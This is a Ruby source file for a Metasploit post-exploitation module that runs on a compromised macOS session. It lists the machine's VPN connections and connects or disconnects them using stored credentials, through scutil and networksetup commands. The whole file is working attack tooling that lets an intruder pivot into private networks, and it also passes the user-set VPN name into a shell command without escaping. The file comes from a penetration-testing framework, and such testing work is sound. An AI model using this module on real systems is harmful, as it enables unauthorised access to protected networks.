##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX VPN manager',
        'Description'   => %q{
          This module lists VPN connections and tries to connect to them using stored credentials.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',     { 'Description' => 'Show a list of VPN connections' } ],
          [ 'CONNECT', { 'Description' => 'Connect to a VPN using stored credentials' } ],
          [ 'DISCONNECT', { 'Description' => 'Disconnect from a VPN' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VPN_CONNECTION', [true, 'Name of VPN connection. `set ACTION LIST` to get a list.', 'OSX_VPN']),
        OptString.new('SCUTIL_PATH', [true, 'Path to the scutil executable.', '/usr/sbin/scutil']),
        OptString.new('NETWORKSETUP_PATH', [true, 'Path to the networksetup executable.', '/usr/sbin/networksetup'])
      ], self.class)

  end

  STR_CONNECTED = '* (Connected)'
  STR_DISCONNECTED = '* (Disconnected)'

  def run
    fail_with("Invalid action") if action.nil?

    if action.name == 'LIST'
      data = get_vpn_list()
      connected_names = parse_vpn_connection_names(data, true)
      disconnected_names = parse_vpn_connection_names(data, false)
      if connected_names.length > 0
        print_status("VPN Connections Status: UP")
        connected_names.each do |vpn_name|
          print_good('  ' + vpn_name)
        end
      end
      if disconnected_names.length > 0
        print_status("VPN Connections Status: DOWN")
        disconnected_names.each do |vpn_name|
          print_good('  ' + vpn_name)
        end
      end
    elsif action.name == 'CONNECT'
      connect_vpn(true)
    elsif action.name == 'DISCONNECT'
      connect_vpn(false)
    end
  end

  def get_vpn_list()
    vprint_status(datastore['SCUTIL_PATH'].shellescape + " --nc list")
    data = cmd_exec(datastore['SCUTIL_PATH'].shellescape + " --nc list")
    return data
  end

  def parse_vpn_connection_names(data, show_up)
    lines = data.split(/\n/).map(&:strip)
    connection_names = Array.new()

    lines.each do |line|
      if show_up && line.start_with?(STR_CONNECTED)
        connection_names.push(line.split('"')[1])
      elsif !show_up && line.start_with?(STR_DISCONNECTED)
        connection_names.push(line.split('"')[1])
      end
    end
    return connection_names
  end

  def connect_vpn(up)
    vpn_name = datastore['VPN_CONNECTION']
    if up
      header = "Connecting to VPN: #{vpn_name}"
      connection_state = STR_CONNECTED
      connection_unnecessary = "#{vpn_name} already connected"
    else
      header = "Disconnecting from VPN: #{vpn_name}"
      connection_state = STR_DISCONNECTED
      connection_unnecessary = "#{vpn_name} already disconnected"
    end

    print_status(header)
    data = get_vpn_list()
    lines = data.split(/\n/).map(&:strip)

    identifier = nil
    lines.each do |line|
      if line.split('"')[1] == vpn_name
        if line.start_with?(connection_state)
          print_status(connection_unnecessary)
          return
        end
        identifier = line.split(' ')[2]
        break
      end
    end

    if identifier.nil?
      print_error("#{vpn_name} not found")
      return
    end

    if up
      cmd = datastore['NETWORKSETUP_PATH'].shellescape + " -connectpppoeservice '#{vpn_name}'"
    else
      cmd = datastore['SCUTIL_PATH'].shellescape + " --nc stop #{identifier}"
    end
    vprint_status(cmd)
    cmd_exec(cmd)
  end
end
